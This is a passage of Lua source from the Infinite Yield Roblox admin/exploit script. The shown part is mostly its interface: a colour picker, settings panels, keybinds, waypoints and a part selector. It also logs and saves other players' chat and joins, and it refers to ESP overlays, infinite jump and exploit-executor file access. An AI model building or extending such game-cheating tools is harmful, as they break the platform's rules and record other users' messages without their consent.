		scroll_3.CanvasPosition = Vector2.new(0,scroll_2.CanvasPosition.Y+infoFrame.AbsoluteSize.Y)
		wait()
		local user = game:HttpGet("https://users.roblox.com/v1/users/"..ID)
		local json = game:GetService("HttpService"):JSONDecode(user)
		local date = json["created"]:sub(1,10)
		local splitDates = string.split(date,"-")
		info2.Text = string.gsub(info2.Text, "Loading...",splitDates[2].."/"..splitDates[3].."/"..splitDates[1])
	end

	IYMouse.KeyDown:Connect(function(Key)
		if (Key==prefix) then
			Cmdbar:CaptureFocus()
			spawn(function()
				repeat Cmdbar.Text = '' until Cmdbar.Text == ''
			end)
			maximizeHolder()
		elseif infJump == true and Key == " " then
			Players.LocalPlayer.Character.Humanoid:ChangeState(3)
		end
	end)

	local lastMinimizeReq = 0
	Holder.MouseEnter:Connect(function()
		lastMinimizeReq = 0
		maximizeHolder()
	end)

	Holder.MouseLeave:Connect(function()
		if not Cmdbar:IsFocused() then
			local reqTime = tick()
			lastMinimizeReq = reqTime
			wait(1)
			if lastMinimizeReq ~= reqTime then return end
			if not Cmdbar:IsFocused() then
				minimizeHolder()
			end
		end
	end)

	function updateColors(color,ctype)
		if ctype == shade1 then
			for i,v in pairs(shade1) do
				v.BackgroundColor3 = color
			end
			currentShade1 = color
		elseif ctype == shade2 then
			for i,v in pairs(shade2) do
				v.BackgroundColor3 = color
			end
			currentShade2 = color
		elseif ctype == shade3 then
			for i,v in pairs(shade3) do
				v.BackgroundColor3 = color
			end
			currentShade3 = color
		elseif ctype == text1 then
			for i,v in pairs(text1) do
				v.TextColor3 = color
				if v:IsA("TextBox") then
					v.PlaceholderColor3 = color	
				end
			end
			currentText1 = color
		elseif ctype == text2 then
			for i,v in pairs(text2) do
				v.TextColor3 = color
			end
			currentText2 = color
		elseif ctype == scroll then
			for i,v in pairs(scroll) do
				v.ScrollBarImageColor3 = color
			end
			currentScroll = color
		end
	end

	local colorpickerOpen = false
	ColorsButton.MouseButton1Click:Connect(function()
		cache_currentShade1 = currentShade1
		cache_currentShade2 = currentShade2
		cache_currentShade3 = currentShade3
		cache_currentText1 = currentText1
		cache_currentText2 = currentText2
		cache_currentScroll = currentScroll
		if not colorpickerOpen then
			colorpickerOpen = true
			picker = game:GetObjects("rbxassetid://4908465318")[1]
			picker.Name = randomString()
			picker.Parent = PARENT

			local ColorPicker do
				ColorPicker = {}

				ColorPicker.new = function()
					local newMt = setmetatable({},{})

					local pickerGui = picker.ColorPicker
					local pickerTopBar = pickerGui.TopBar
					local pickerExit = pickerTopBar.Exit
					local pickerFrame = pickerGui.Content
					local colorSpace = pickerFrame.ColorSpaceFrame.ColorSpace
					local colorStrip = pickerFrame.ColorStrip
					local previewFrame = pickerFrame.Preview
					local basicColorsFrame = pickerFrame.BasicColors
					local customColorsFrame = pickerFrame.CustomColors
					local defaultButton = pickerFrame.Default
					local cancelButton = pickerFrame.Cancel
					local shade1Button = pickerFrame.Shade1
					local shade2Button = pickerFrame.Shade2
					local shade3Button = pickerFrame.Shade3
					local text1Button = pickerFrame.Text1
					local text2Button = pickerFrame.Text2
					local scrollButton = pickerFrame.Scroll

					local colorScope = colorSpace.Scope
					local colorArrow = pickerFrame.ArrowFrame.Arrow

					local hueInput = pickerFrame.Hue.Input
					local satInput = pickerFrame.Sat.Input
					local valInput = pickerFrame.Val.Input

					local redInput = pickerFrame.Red.Input
					local greenInput = pickerFrame.Green.Input
					local blueInput = pickerFrame.Blue.Input

					local mouse = IYMouse

					local hue,sat,val = 0,0,1
					local red,green,blue = 1,1,1
					local chosenColor = Color3.new(0,0,0)

					local basicColors = {Color3.new(0,0,0),Color3.new(0.66666668653488,0,0),Color3.new(0,0.33333334326744,0),Color3.new(0.66666668653488,0.33333334326744,0),Color3.new(0,0.66666668653488,0),Color3.new(0.66666668653488,0.66666668653488,0),Color3.new(0,1,0),Color3.new(0.66666668653488,1,0),Color3.new(0,0,0.49803924560547),Color3.new(0.66666668653488,0,0.49803924560547),Color3.new(0,0.33333334326744,0.49803924560547),Color3.new(0.66666668653488,0.33333334326744,0.49803924560547),Color3.new(0,0.66666668653488,0.49803924560547),Color3.new(0.66666668653488,0.66666668653488,0.49803924560547),Color3.new(0,1,0.49803924560547),Color3.new(0.66666668653488,1,0.49803924560547),Color3.new(0,0,1),Color3.new(0.66666668653488,0,1),Color3.new(0,0.33333334326744,1),Color3.new(0.66666668653488,0.33333334326744,1),Color3.new(0,0.66666668653488,1),Color3.new(0.66666668653488,0.66666668653488,1),Color3.new(0,1,1),Color3.new(0.66666668653488,1,1),Color3.new(0.33333334326744,0,0),Color3.new(1,0,0),Color3.new(0.33333334326744,0.33333334326744,0),Color3.new(1,0.33333334326744,0),Color3.new(0.33333334326744,0.66666668653488,0),Color3.new(1,0.66666668653488,0),Color3.new(0.33333334326744,1,0),Color3.new(1,1,0),Color3.new(0.33333334326744,0,0.49803924560547),Color3.new(1,0,0.49803924560547),Color3.new(0.33333334326744,0.33333334326744,0.49803924560547),Color3.new(1,0.33333334326744,0.49803924560547),Color3.new(0.33333334326744,0.66666668653488,0.49803924560547),Color3.new(1,0.66666668653488,0.49803924560547),Color3.new(0.33333334326744,1,0.49803924560547),Color3.new(1,1,0.49803924560547),Color3.new(0.33333334326744,0,1),Color3.new(1,0,1),Color3.new(0.33333334326744,0.33333334326744,1),Color3.new(1,0.33333334326744,1),Color3.new(0.33333334326744,0.66666668653488,1),Color3.new(1,0.66666668653488,1),Color3.new(0.33333334326744,1,1),Color3.new(1,1,1)}
					local customColors = {}

					dragGUI(picker)

					local function updateColor(noupdate)
						local relativeX,relativeY,relativeStripY = 219 - hue*219, 199 - sat*199, 199 - val*199
						local hsvColor = Color3.fromHSV(hue,sat,val)

						if noupdate == 2 or not noupdate then
							hueInput.Text = tostring(math.ceil(359*hue))
							satInput.Text = tostring(math.ceil(255*sat))
							valInput.Text = tostring(math.floor(255*val))
						end
						if noupdate == 1 or not noupdate then
							redInput.Text = tostring(math.floor(255*red))
							greenInput.Text = tostring(math.floor(255*green))
							blueInput.Text = tostring(math.floor(255*blue))
						end

						chosenColor = Color3.new(red,green,blue)

						colorScope.Position = UDim2.new(0,relativeX-9,0,relativeY-9)
						colorStrip.ImageColor3 = Color3.fromHSV(hue,sat,1)
						colorArrow.Position = UDim2.new(0,-2,0,relativeStripY-4)
						previewFrame.BackgroundColor3 = chosenColor

						newMt.Color = chosenColor
						if newMt.Changed then newMt:Changed(chosenColor) end
					end

					local function colorSpaceInput()
						local relativeX = mouse.X - colorSpace.AbsolutePosition.X
						local relativeY = mouse.Y - colorSpace.AbsolutePosition.Y

						if relativeX < 0 then relativeX = 0 elseif relativeX > 219 then relativeX = 219 end
						if relativeY < 0 then relativeY = 0 elseif relativeY > 199 then relativeY = 199 end

						hue = (219 - relativeX)/219
						sat = (199 - relativeY)/199

						local hsvColor = Color3.fromHSV(hue,sat,val)
						red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b

						updateColor()
					end

					local function colorStripInput()
						local relativeY = mouse.Y - colorStrip.AbsolutePosition.Y

						if relativeY < 0 then relativeY = 0 elseif relativeY > 199 then relativeY = 199 end	

						val = (199 - relativeY)/199

						local hsvColor = Color3.fromHSV(hue,sat,val)
						red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b

						updateColor()
					end

					local function hookButtons(frame,func)
						frame.ArrowFrame.Up.InputBegan:Connect(function(input)
							if input.UserInputType == Enum.UserInputType.MouseMovement then
								frame.ArrowFrame.Up.BackgroundTransparency = 0.5
							elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
								local releaseEvent,runEvent

								local startTime = tick()
								local pressing = true
								local startNum = tonumber(frame.Text)

								if not startNum then return end

								releaseEvent = UserInputService.InputEnded:Connect(function(input)
									if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
									releaseEvent:Disconnect()
									pressing = false
								end)

								startNum = startNum + 1
								func(startNum)
								while pressing do
									if tick()-startTime > 0.3 then
										startNum = startNum + 1
										func(startNum)
									end
									wait(0.1)
								end
							end
						end)

						frame.ArrowFrame.Up.InputEnded:Connect(function(input)
							if input.UserInputType == Enum.UserInputType.MouseMovement then
								frame.ArrowFrame.Up.BackgroundTransparency = 1
							end
						end)

						frame.ArrowFrame.Down.InputBegan:Connect(function(input)
							if input.UserInputType == Enum.UserInputType.MouseMovement then
								frame.ArrowFrame.Down.BackgroundTransparency = 0.5
							elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
								local releaseEvent,runEvent

								local startTime = tick()
								local pressing = true
								local startNum = tonumber(frame.Text)

								if not startNum then return end

								releaseEvent = UserInputService.InputEnded:Connect(function(input)
									if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
									releaseEvent:Disconnect()
									pressing = false
								end)

								startNum = startNum - 1
								func(startNum)
								while pressing do
									if tick()-startTime > 0.3 then
										startNum = startNum - 1
										func(startNum)
									end
									wait(0.1)
								end
							end
						end)

						frame.ArrowFrame.Down.InputEnded:Connect(function(input)
							if input.UserInputType == Enum.UserInputType.MouseMovement then
								frame.ArrowFrame.Down.BackgroundTransparency = 1
							end
						end)
					end

					colorSpace.InputBegan:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 then
							local releaseEvent,mouseEvent

							releaseEvent = UserInputService.InputEnded:Connect(function(input)
								if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
								releaseEvent:Disconnect()
								mouseEvent:Disconnect()
							end)

							mouseEvent = UserInputService.InputChanged:Connect(function(input)
								if input.UserInputType == Enum.UserInputType.MouseMovement then
									colorSpaceInput()
								end
							end)

							colorSpaceInput()
						end
					end)

					colorStrip.InputBegan:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 then
							local releaseEvent,mouseEvent

							releaseEvent = UserInputService.InputEnded:Connect(function(input)
								if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
								releaseEvent:Disconnect()
								mouseEvent:Disconnect()
							end)

							mouseEvent = UserInputService.InputChanged:Connect(function(input)
								if input.UserInputType == Enum.UserInputType.MouseMovement then
									colorStripInput()
								end
							end)

							colorStripInput()
						end
					end)

					local function updateHue(str)
						local num = tonumber(str)
						if num then
							hue = math.clamp(math.floor(num),0,359)/359
							local hsvColor = Color3.fromHSV(hue,sat,val)
							red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
							hueInput.Text = tostring(hue*359)
							updateColor(1)
						end
					end
					hueInput.FocusLost:Connect(function() updateHue(hueInput.Text) end) hookButtons(hueInput,updateHue)

					local function updateSat(str)
						local num = tonumber(str)
						if num then
							sat = math.clamp(math.floor(num),0,255)/255
							local hsvColor = Color3.fromHSV(hue,sat,val)
							red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
							satInput.Text = tostring(sat*255)
							updateColor(1)
						end
					end
					satInput.FocusLost:Connect(function() updateSat(satInput.Text) end) hookButtons(satInput,updateSat)

					local function updateVal(str)
						local num = tonumber(str)
						if num then
							val = math.clamp(math.floor(num),0,255)/255
							local hsvColor = Color3.fromHSV(hue,sat,val)
							red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
							valInput.Text = tostring(val*255)
							updateColor(1)
						end
					end
					valInput.FocusLost:Connect(function() updateVal(valInput.Text) end) hookButtons(valInput,updateVal)

					local function updateRed(str)
						local num = tonumber(str)
						if num then
							red = math.clamp(math.floor(num),0,255)/255
							local newColor = Color3.new(red,green,blue)
							hue,sat,val = Color3.toHSV(newColor)
							redInput.Text = tostring(red*255)
							updateColor(2)
						end
					end
					redInput.FocusLost:Connect(function() updateRed(redInput.Text) end) hookButtons(redInput,updateRed)

					local function updateGreen(str)
						local num = tonumber(str)
						if num then
							green = math.clamp(math.floor(num),0,255)/255
							local newColor = Color3.new(red,green,blue)
							hue,sat,val = Color3.toHSV(newColor)
							greenInput.Text = tostring(green*255)
							updateColor(2)
						end
					end
					greenInput.FocusLost:Connect(function() updateGreen(greenInput.Text) end) hookButtons(greenInput,updateGreen)

					local function updateBlue(str)
						local num = tonumber(str)
						if num then
							blue = math.clamp(math.floor(num),0,255)/255
							local newColor = Color3.new(red,green,blue)
							hue,sat,val = Color3.toHSV(newColor)
							blueInput.Text = tostring(blue*255)
							updateColor(2)
						end
					end
					blueInput.FocusLost:Connect(function() updateBlue(blueInput.Text) end) hookButtons(blueInput,updateBlue)

					local colorChoice = Instance.new("TextButton")
					colorChoice.Name = "Choice"
					colorChoice.Size = UDim2.new(0,25,0,18)
					colorChoice.BorderColor3 = Color3.new(96/255,96/255,96/255)
					colorChoice.Text = ""
					colorChoice.AutoButtonColor = false
					colorChoice.ZIndex = 10

					local row = 0
					local column = 0
					for i,v in pairs(basicColors) do
						local newColor = colorChoice:Clone()
						newColor.BackgroundColor3 = v
						newColor.Position = UDim2.new(0,1 + 30*column,0,21 + 23*row)

						newColor.MouseButton1Click:Connect(function()
							red,green,blue = v.r,v.g,v.b
							local newColor = Color3.new(red,green,blue)
							hue,sat,val = Color3.toHSV(newColor)
							updateColor()
						end)	

						newColor.Parent = basicColorsFrame
						column = column + 1
						if column == 6 then row = row + 1 column = 0 end
					end

					row = 0
					column = 0
					for i = 1,12 do
						local color = customColors[i] or Color3.new(0,0,0)
						local newColor = colorChoice:Clone()
						newColor.BackgroundColor3 = color
						newColor.Position = UDim2.new(0,1 + 30*column,0,20 + 23*row)

						newColor.MouseButton1Click:Connect(function()
							local curColor = customColors[i] or Color3.new(0,0,0)
							red,green,blue = curColor.r,curColor.g,curColor.b
							hue,sat,val = Color3.toHSV(curColor)
							updateColor()
						end)

						newColor.MouseButton2Click:Connect(function()
							customColors[i] = chosenColor
							newColor.BackgroundColor3 = chosenColor
						end)

						newColor.Parent = customColorsFrame
						column = column + 1
						if column == 6 then row = row + 1 column = 0 end
					end

					shade1Button.MouseButton1Click:Connect(function() if newMt.Confirm then newMt:Confirm(chosenColor,shade1) end end)
					shade1Button.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then shade1Button.BackgroundTransparency = 0.4 end end)
					shade1Button.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then shade1Button.BackgroundTransparency = 0 end end)

					shade2Button.MouseButton1Click:Connect(function() if newMt.Confirm then newMt:Confirm(chosenColor,shade2) end end)
					shade2Button.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then shade2Button.BackgroundTransparency = 0.4 end end)
					shade2Button.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then shade2Button.BackgroundTransparency = 0 end end)

					shade3Button.MouseButton1Click:Connect(function() if newMt.Confirm then newMt:Confirm(chosenColor,shade3) end end)
					shade3Button.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then shade3Button.BackgroundTransparency = 0.4 end end)
					shade3Button.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then shade3Button.BackgroundTransparency = 0 end end)

					text1Button.MouseButton1Click:Connect(function() if newMt.Confirm then newMt:Confirm(chosenColor,text1) end end)
					text1Button.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then text1Button.BackgroundTransparency = 0.4 end end)
					text1Button.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then text1Button.BackgroundTransparency = 0 end end)

					text2Button.MouseButton1Click:Connect(function() if newMt.Confirm then newMt:Confirm(chosenColor,text2) end end)
					text2Button.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then text2Button.BackgroundTransparency = 0.4 end end)
					text2Button.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then text2Button.BackgroundTransparency = 0 end end)

					scrollButton.MouseButton1Click:Connect(function() if newMt.Confirm then newMt:Confirm(chosenColor,scroll) end end)
					scrollButton.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then scrollButton.BackgroundTransparency = 0.4 end end)
					scrollButton.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then scrollButton.BackgroundTransparency = 0 end end)

					cancelButton.MouseButton1Click:Connect(function() if newMt.Cancel then newMt:Cancel() end end)
					cancelButton.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then cancelButton.BackgroundTransparency = 0.4 end end)
					cancelButton.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then cancelButton.BackgroundTransparency = 0 end end)

					defaultButton.MouseButton1Click:Connect(function() if newMt.Default then newMt:Default() end end)
					defaultButton.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then defaultButton.BackgroundTransparency = 0.4 end end)
					defaultButton.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then defaultButton.BackgroundTransparency = 0 end end)

					pickerExit.MouseButton1Click:Connect(function()
						picker:TweenPosition(UDim2.new(0.5, -219, 0, -500), "InOut", "Quart", 0.5, true, nil)
					end)

					updateColor()

					newMt.SetColor = function(self,color)
						red,green,blue = color.r,color.g,color.b
						hue,sat,val = Color3.toHSV(color)
						updateColor()
					end

					return newMt
				end
			end

			picker:TweenPosition(UDim2.new(0.5, -219, 0, 100), "InOut", "Quart", 0.5, true, nil)

			local Npicker = ColorPicker.new()
			Npicker.Confirm = function(self,color,ctype) updateColors(color,ctype) wait() updatesaves() end
			Npicker.Cancel = function(self)
				updateColors(cache_currentShade1,shade1)
				updateColors(cache_currentShade2,shade2)
				updateColors(cache_currentShade3,shade3)
				updateColors(cache_currentText1,text1)
				updateColors(cache_currentText2,text2)
				updateColors(cache_currentScroll,scroll)
				wait()
				updatesaves()
			end
			Npicker.Default = function(self)
				updateColors(Color3.fromRGB(36, 36, 37),shade1)
				updateColors(Color3.fromRGB(46, 46, 47),shade2)
				updateColors(Color3.fromRGB(78, 78, 79),shade3)
				updateColors(Color3.new(1, 1, 1),text1)
				updateColors(Color3.new(0, 0, 0),text2)
				updateColors(Color3.fromRGB(78,78,79),scroll)
				wait()
				updatesaves()
			end
		else
			picker:TweenPosition(UDim2.new(0.5, -219, 0, 100), "InOut", "Quart", 0.5, true, nil)
		end
	end)


	SettingsButton.MouseButton1Click:Connect(function()
		if SettingsOpen == false then SettingsOpen = true
			Settings:TweenPosition(UDim2.new(0, 0, 0, 45), "InOut", "Quart", 0.5, true, nil)
			CMDsF.Visible = false
		else SettingsOpen = false
			CMDsF.Visible = true
			Settings:TweenPosition(UDim2.new(0, 0, 0, 220), "InOut", "Quart", 0.5, true, nil)
		end
	end)

	On.MouseButton1Click:Connect(function()
		if StayOpen == false then StayOpen = true
			On.BackgroundTransparency = 0
		else StayOpen = false
			On.BackgroundTransparency = 1
		end
		updatesaves()
	end)

	Clear.MouseButton1Down:Connect(function()
		for _, child in pairs(scroll_2:GetChildren()) do
			child:Destroy()
		end
		scroll_2.CanvasSize = UDim2.new(0, 0, 0, 10)
	end)

	Toggle.MouseButton1Down:Connect(function()
		if logsEnabled then
			logsEnabled = false
			Toggle.Text = 'Disabled'
			updatesaves()
		else
			logsEnabled = true
			Toggle.Text = 'Enabled'
			updatesaves()
		end
	end)

	Toggle_2.MouseButton1Down:Connect(function()
		if jLogsEnabled then
			jLogsEnabled = false
			Toggle_2.Text = 'Disabled'
			updatesaves()
		else
			jLogsEnabled = true
			Toggle_2.Text = 'Enabled'
			updatesaves()
		end
	end)

	selectChat.MouseButton1Down:Connect(function()
		join.Visible = false
		chat.Visible = true
		table.remove(shade3,table.find(shade3,selectChat))
		table.remove(shade2,table.find(shade2,selectJoin))
		table.insert(shade2,selectChat)
		table.insert(shade3,selectJoin)
		selectJoin.BackgroundColor3 = currentShade3
		selectChat.BackgroundColor3 = currentShade2
	end)

	selectJoin.MouseButton1Down:Connect(function()
		chat.Visible = false
		join.Visible = true	
		table.remove(shade3,table.find(shade3,selectJoin))
		table.remove(shade2,table.find(shade2,selectChat))
		table.insert(shade2,selectJoin)
		table.insert(shade3,selectChat)
		selectChat.BackgroundColor3 = currentShade3
		selectJoin.BackgroundColor3 = currentShade2
	end)

	if not writefileExploit() then
		notify('Saves','Your exploit does not support read/write file. Your settings will not save.')
	end

	ChatLog = function(plr)
		plr.Chatted:Connect(function(Message)
			if logsEnabled == true then
				CreateLabel(plr.Name,Message)
			end
		end)
	end

	JoinLog = function(plr)
		if jLogsEnabled == true then
			CreateJoinLabel(plr,plr.UserId)
		end
	end

	SaveChatlogs.MouseButton1Down:Connect(function()
		if writefileExploit() then
			if #scroll_2:GetChildren() > 0 then
				notify("Loading",'Hold on a sec')
				local placeName = game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name
				local writelogs = '-- Infinite Yield Chat logs for "'..placeName..'"\n'
				for _, child in pairs(scroll_2:GetChildren()) do
					writelogs = writelogs..'\n'..child.Text
				end
				local writelogsFile = tostring(writelogs)
				local fileext = 0
				local function nameFile()
					local file
					pcall(function() file = readfile(placeName..' Chat Logs ('..fileext..').txt') end)
					if file then
						fileext = fileext+1
						nameFile()
					else
						writefileCooldown(placeName..' Chat Logs ('..fileext..').txt', writelogsFile)
					end
				end
				nameFile()
				notify('Chat Logs','Saved chat logs to the workspace folder within your exploit folder.')
			end
		else
			notify('Chat Logs','Your exploit does not support write file. You cannot save chat logs.')
		end
	end)

	for _, plr in pairs(Players:GetChildren()) do
		if plr.ClassName == "Player" then
			ChatLog(plr)
		end
	end

	Players.PlayerRemoving:Connect(function(player)
		if ESPenabled or CHMSenabled or COREGUI:FindFirstChild(player.Name..'_LC') then
			for i,v in pairs(COREGUI:GetChildren()) do
				if v.Name == player.Name..'_ESP' or v.Name == player.Name..'_LC' or v.Name == player.Name..'_CHMS' then
					v:Destroy()
				end
			end
		end
		if viewing ~= nil and player == viewing then
			workspace.CurrentCamera.CameraSubject = Players.LocalPlayer.Character
			viewing = nil
			if viewDied then
				viewDied:Disconnect()
				viewChanged:Disconnect()
			end
			notify('Spectate','View turned off (player left)')
		end
	end)

	Exit.MouseButton1Down:Connect(function()
		logs:TweenPosition(UDim2.new(0, 0, 1, 10), "InOut", "Quart", 0.3, true, nil)
	end)

	Hide.MouseButton1Down:Connect(function()
		if logs.Position ~= UDim2.new(0, 0, 1, -20) then
			logs:TweenPosition(UDim2.new(0, 0, 1, -20), "InOut", "Quart", 0.3, true, nil)
		else
			logs:TweenPosition(UDim2.new(0, 0, 1, -265), "InOut", "Quart", 0.3, true, nil)
		end
	end)

	EventBind.MouseButton1Click:Connect(function()
		eventEditor.Frame:TweenPosition(UDim2.new(0.5,-175,0.5,-101), "InOut", "Quart", 0.5, true, nil)
	end)

	Keybinds.MouseButton1Click:Connect(function()
		KeybindsFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
		wait(0.5)
		SettingsHolder.Visible = false
	end)

	Close.MouseButton1Click:Connect(function()
		SettingsHolder.Visible = true
		KeybindsFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
	end)

	Keybinds.MouseButton1Click:Connect(function()
		KeybindsFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
		wait(0.5)
		SettingsHolder.Visible = false
	end)

	Add.MouseButton1Click:Connect(function()
		KeybindEditor:TweenPosition(UDim2.new(0.5, -180, 0, 260), "InOut", "Quart", 0.5, true, nil)
	end)

	Delete.MouseButton1Click:Connect(function()
		binds = {}
		refreshbinds()
		updatesaves()
		notify('Keybinds Updated','Removed all keybinds')
	end)

	Close_2.MouseButton1Click:Connect(function()
		SettingsHolder.Visible = true
		AliasesFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
	end)

	Aliases.MouseButton1Click:Connect(function()
		AliasesFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
		wait(0.5)
		SettingsHolder.Visible = false
	end)

	Close_3.MouseButton1Click:Connect(function()
		SettingsHolder.Visible = true
		PositionsFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
	end)

	Positions.MouseButton1Click:Connect(function()
		PositionsFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
		wait(0.5)
		SettingsHolder.Visible = false
	end)

	local selectionBox = Instance.new("SelectionBox")
	selectionBox.Name = randomString()
	selectionBox.Color3 = Color3.new(255,255,255)
	selectionBox.Adornee = nil
	selectionBox.Parent = PARENT

	local selected = Instance.new("SelectionBox")
	selected.Name = randomString()
	selected.Color3 = Color3.new(0,166,0)
	selected.Adornee = nil
	selected.Parent = PARENT

	local ActivateHighlight = nil
	local ClickSelect = nil
	function selectPart()
		ToPartFrame:TweenPosition(UDim2.new(0.5, -180, 0, 335), "InOut", "Quart", 0.5, true, nil)
		local function HighlightPart()
			if selected.Adornee ~= IYMouse.Target then
				selectionBox.Adornee = IYMouse.Target
			else
				selectionBox.Adornee = nil
			end
		end
		ActivateHighlight = IYMouse.Move:Connect(HighlightPart)
		local function SelectPart()
			if IYMouse.Target ~= nil then
				selected.Adornee = IYMouse.Target
				Path.Text = getHierarchy(IYMouse.Target)
			end
		end
		ClickSelect = IYMouse.Button1Down:Connect(SelectPart)
	end

	Part.MouseButton1Click:Connect(function()
		selectPart()
	end)

	Exit_4.MouseButton1Click:Connect(function()
		ToPartFrame:TweenPosition(UDim2.new(0.5, -180, 0, -500), "InOut", "Quart", 0.5, true, nil)
		if ActivateHighlight then
			ActivateHighlight:Disconnect()
		end
		if ClickSelect then
			ClickSelect:Disconnect()
		end
		selectionBox.Adornee = nil
		selected.Adornee = nil
		Path.Text = ""
	end)

	CopyPath.MouseButton1Click:Connect(function()
		if Path.Text ~= "" then
			toClipboard(Path.Text)
		else
			notify('Copy Path','Select a part to copy its path')
		end
	end)

	ChoosePart.MouseButton1Click:Connect(function()
		if Path.Text ~= "" then
			local tpNameExt = ''
			local function handleWpNames()
				local FoundDupe = false
				for i,v in pairs(pWayPoints) do
					if v.NAME:lower() == selected.Adornee.Name:lower()..tpNameExt then
						FoundDupe = true
					end
				end
				if not FoundDupe then
					notify('Modified Waypoints',"Created waypoint: "..selected.Adornee.Name..tpNameExt)
					pWayPoints[#pWayPoints + 1] = {NAME = selected.Adornee.Name..tpNameExt, COORD = {selected.Adornee}}
				else
					if isNumber(tpNameExt) then
						tpNameExt = tpNameExt+1
					else
						tpNameExt = 1
					end
					handleWpNames()
				end
			end
			handleWpNames()
			refreshwaypoints()
		else
			notify('Part Selection','Select a part first')
		end
	end)

	cmds={}
	customAlias = {}
	Delete_3.MouseButton1Click:Connect(function()
		customAlias = {}
		aliases = {}
		notify('Aliases Modified','Removed all aliases')
		updatesaves()
		refreshaliases()
	end)

	PrefixBox:GetPropertyChangedSignal("Text"):Connect(function()
		prefix = PrefixBox.Text
		Cmdbar.PlaceholderText = "Command Bar ("..prefix..")"
		updatesaves()
	end)

	function CamViewport()
		if workspace.CurrentCamera then
			return workspace.CurrentCamera.ViewportSize.X
		end
	end

	function UpdateToViewport()
		if Holder.Position.X.Offset < -CamViewport() then
			Holder:TweenPosition(UDim2.new(1, -CamViewport(), Holder.Position.Y.Scale, Holder.Position.Y.Offset), "InOut", "Quart", 0.04, true, nil)
			Notification:TweenPosition(UDim2.new(1, -CamViewport() + 250, Notification.Position.Y.Scale, Notification.Position.Y.Offset), "InOut", "Quart", 0.04, true, nil)
		end
	end
	CameraChanged = workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(UpdateToViewport)

	function updateCamera(child, parent)
		if parent ~= workspace then
			CamMoved:Disconnect()
			CameraChanged:Disconnect()
			repeat wait() until workspace.CurrentCamera
			CameraChanged = workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(UpdateToViewport)
			CamMoved = workspace.CurrentCamera.AncestryChanged:Connect(updateCamera)
		end
	end
	CamMoved = workspace.CurrentCamera.AncestryChanged:Connect(updateCamera)

	function dragMain(dragpoint,gui)
		spawn(function()
			local dragging
			local dragInput
			local dragStart = Vector3.new(0,0,0)
			local startPos
			local function update(input)
				local pos = -250
				local delta = input.Position - dragStart
				if startPos.X.Offset + delta.X <= -500 then
					local Position = UDim2.new(1, -250, Notification.Position.Y.Scale, Notification.Position.Y.Offset)
					game:GetService("TweenService"):Create(Notification, TweenInfo.new(.20), {Position = Position}):Play()
					pos = 250
				else
					local Position = UDim2.new(1, -500, Notification.Position.Y.Scale, Notification.Position.Y.Offset)
					game:GetService("TweenService"):Create(Notification, TweenInfo.new(.20), {Position = Position}):Play()
					pos = -250
				end
				if startPos.X.Offset + delta.X <= -250 and -CamViewport() <= startPos.X.Offset + delta.X then
					local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, gui.Position.Y.Scale, gui.Position.Y.Offset)
					game:GetService("TweenService"):Create(gui, TweenInfo.new(.20), {Position = Position}):Play()
					local Position2 = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X + pos, Notification.Position.Y.Scale, Notification.Position.Y.Offset)
					game:GetService("TweenService"):Create(Notification, TweenInfo.new(.20), {Position = Position2}):Play()
				elseif startPos.X.Offset + delta.X > -500 then
					local Position = UDim2.new(1, -250, gui.Position.Y.Scale, gui.Position.Y.Offset)
					game:GetService("TweenService"):Create(gui, TweenInfo.new(.20), {Position = Position}):Play()
				elseif -CamViewport() > startPos.X.Offset + delta.X then
					gui:TweenPosition(UDim2.new(1, -CamViewport(), gui.Position.Y.Scale, gui.Position.Y.Offset), "InOut", "Quart", 0.04, true, nil)
					local Position = UDim2.new(1, -CamViewport(), gui.Position.Y.Scale, gui.Position.Y.Offset)
